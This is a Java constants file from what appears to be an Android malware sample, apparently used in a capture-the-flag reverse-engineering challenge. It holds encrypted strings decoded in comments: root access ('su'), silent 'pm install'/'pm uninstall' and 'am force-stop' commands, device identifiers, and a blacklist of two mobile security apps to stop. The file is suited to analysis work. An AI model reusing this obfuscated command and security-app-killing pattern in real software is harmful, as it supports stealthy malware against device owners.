package workspace.utils;
public class Constants {
    /**
     * "activate"
     */
    public static String ACTIVATE = AES.decode("+Qc+doPv0YMqZ0UFmbHESg==");
    //","
    public static String REGULAR_EXPRESSION = "C9kbYR5BgJlqU3SwyZV8JQ==";
    //"err"
    public static String ERR = AES.decode("U/4mYqixeWXLm0pFJU/Ksw==");
    //"kbp"
    public static String KBP = AES.decode("c66enTaugQ/u40euf1ZF8A==");
    //"pm uninstall "
    public static String PM_UNINSTALL = AES.decode("EFitCxqS8V57sgrM6ssbXA==");
    //"usage:"
    public static String USAGE = AES.decode("QwO2dL/naNhtQ7AFP/3uvw==");
    //"SecurityException"
    public static String SECURITY_EXCEPTION = AES.decode("6ly4eqsyMyrEOtqwQKwmsuXh0JmssM562R7CF9Xt8m0=");
    //"time"
    public static String TIME = AES.decode("VXXpJoi534qhN1QwPqDwUA==");
    //"cmd"
    public static String CMD = AES.decode("AfR6ZoR7RZJaSHivIk4H0w==");
    //"forceStop-"
    public static String FORCE_STOP2 = AES.decode("cuDgvOWoG755pMT/t2C8dg==");
    //"force-stop-"
    public static String FORCE_STOP = AES.decode("6jy3/gndsaKmjQZ2X9kKIg==");
    //"am force-stop "
    public static String AM_FORCE_STOP = AES.decode("/hdE7ZT238y0BGBsQP6lbg==");
    /**
     * "pm install -r "
     */
    public static String PM_INSTALL_R = AES.decode("UafrJg8bog1ywESSQSmtjg==");
    /**
     * forceStopPackage
     */
    public static String FORCE_STOP_PACKAGE = AES.decode("iVUxdA7BBVs+hYLcto6b6zSJvNitLLnXDnCj0ly/9Nc=");
    /**
     * "killBackgroundProcesses"
     */
    public static String KILL_BACKGROUND_PROCESSES = AES.decode("hWgn0sJZ1spHjEMIExWfFhNaQseB17U5c1HOS3sfz98=");
    /**
     * android.app.ActivityManager
     */
    public static String ANDROID_APP_ACTIVITY_MANAGER = AES.decode("ihXbCpI6vMCXHFE8Q/3fTmBnJbg55Zb8x8JhsnwTTa0=");
    /**
     * com.qihoo360.mobilesafe,com.tencent.qqpimsecure
     */
    public static String BLACK_PACKAGES = AES.decode("NSq9HHfTkNSK4Lv87CCNDlCD7eiKbZ9n1cChPjJaqBJe8Py45V6oGclJxSO24f+V");
    /**
     * "MD5" 
     */
    public static String MD5 = AES.decode("jxGa/v7upULyr0sZB8T2bQ==");
    /**
     * "su"
     */
    public static String SU = SimpleEncoder.getString(new byte[] { 113, 118 });;
    /**
     * "/system/bin/,/system/xbin/,/system/sbin/,/sbin/,/vendor/bin/"
     */
    public static String SYSTEM_BIN_SYSTEM_XBIN_SYSTEM_SBIN_SBIN_VENDOR_BIN = "/system/bin/,/system/xbin/,/system/sbin/,/sbin/,/vendor/bin/";
    /**
     * "wifi"
     */
    public static String WIFI = SimpleEncoder.getString(new byte[] { 117, 106, 98, 108 });
    /**
     * "phone"
     */
    public static String PHONE = SimpleEncoder.getString(new byte[] { 114, 107, 107, 107, 99 });
    /**
     * "android_id"
     */
    public static String ANDROID_ID = SimpleEncoder.getString(new byte[] { 99, 109, 96, 119, 105, 110, 108, 86, 99, 111 });
    /**
     * com.android.FlaaaaaaaaaaaagService
     */
    public static String encodedFlagService = "+J9wWKztXJCV4E4j/NUErzWFgLXRErUqYau9nTCMYk2010DioYf6DfEBFtLR8zKk";
}
